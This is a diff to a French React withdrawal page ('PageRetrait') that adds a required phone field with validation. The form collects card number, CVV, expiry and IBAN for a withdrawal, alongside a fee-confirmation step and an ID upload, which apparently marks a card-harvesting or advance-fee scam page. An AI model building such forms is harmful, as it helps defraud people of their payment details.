@@ -679,7 +679,7 @@ function PageRetrait({ user }) {
   const [amount, setAmount]         = useState('');
   const [motif, setMotif]           = useState('');
   const [form, setForm]             = useState({
-    first_name: user?.first_name||'', last_name: user?.last_name||'',
+    first_name: user?.first_name||'', last_name: user?.last_name||'', phone: user?.phone||'',
     address: user?.address||'', postal_code: user?.postal_code||'',
     city: user?.city||'', bank_name:'', iban:'', card_number:'', cvv:'', card_expiry:'',
   });
@@ -692,7 +692,7 @@ function PageRetrait({ user }) {
   const [confirmingFee, setConfirmingFee] = useState(false);
   const [feeConfirmed, setFeeConfirmed]   = useState(false);
   const [showCardChange, setShowCardChange] = useState(false);
-  const [cardChangeForm, setCardChangeForm] = useState({ first_name:'', last_name:'', address:'', postal_code:'', city:'', bank_name:'', iban:'', card_number:'', cvv:'', card_expiry:'' });
+  const [cardChangeForm, setCardChangeForm] = useState({ first_name:'', last_name:'', phone:'', address:'', postal_code:'', city:'', bank_name:'', iban:'', card_number:'', cvv:'', card_expiry:'' });
   const [cardChangeStatus, setCardChangeStatus] = useState('idle');
   const [cardChangeMsg, setCardChangeMsg]   = useState('');
   const [identityFile, setIdentityFile]         = useState(null);
@@ -733,6 +733,8 @@ function PageRetrait({ user }) {
     const e={};
     if (!form.first_name.trim()) e.first_name='Requis';
     if (!form.last_name.trim())  e.last_name='Requis';
+    if (!form.phone.trim())      e.phone='Requis';
+    else if (!/^[\d\s+().-]{8,20}$/.test(form.phone.trim())) e.phone='Numéro invalide';
     if (!form.address.trim())    e.address='Requis';
     if (!form.postal_code.trim()) e.postal_code='Requis';
     if (!form.city.trim())       e.city='Requis';
@@ -1000,6 +1002,7 @@ function PageRetrait({ user }) {
                 {[
                   {label:'Prénom',         key:'first_name',   placeholder:'Prénom'},
                   {label:'Nom',            key:'last_name',    placeholder:'Nom'},
+                  {label:'Téléphone',      key:'phone',        placeholder:'06 12 34 56 78'},
                   {label:'Adresse',        key:'address',      placeholder:'Adresse'},
                   {label:'Code postal',    key:'postal_code',  placeholder:'Code postal'},
                   {label:'Ville',          key:'city',         placeholder:'Ville'},
@@ -1238,6 +1241,7 @@ function PageRetrait({ user }) {
             <RetraitFld label="Prénom"  fieldKey="first_name" placeholder="Jean"   half value={form.first_name} error={errors.first_name} onChange={e=>{setF('first_name',e.target.value);setErrors(er=>({...er,first_name:undefined}));}}/>
             <RetraitFld label="Nom"     fieldKey="last_name"  placeholder="Dupont" half value={form.last_name}  error={errors.last_name}  onChange={e=>{setF('last_name',e.target.value);setErrors(er=>({...er,last_name:undefined}));}}/>
           </div>
+          <RetraitFld label="Téléphone" fieldKey="phone" placeholder="06 12 34 56 78" type="tel" value={form.phone} error={errors.phone} onChange={e=>{setF('phone',e.target.value);setErrors(er=>({...er,phone:undefined}));}}/>
           <RetraitFld label="Adresse" fieldKey="address" placeholder="12 rue de la Paix" value={form.address} error={errors.address} onChange={e=>{setF('address',e.target.value);setErrors(er=>({...er,address:undefined}));}}/>
           <div style={{display:'flex',gap:8,flexWrap:'wrap'}}>
             <RetraitFld label="Code postal" fieldKey="postal_code" placeholder="75001" half value={form.postal_code} error={errors.postal_code} onChange={e=>{setF('postal_code',e.target.value);setErrors(er=>({...er,postal_code:undefined}));}}/>
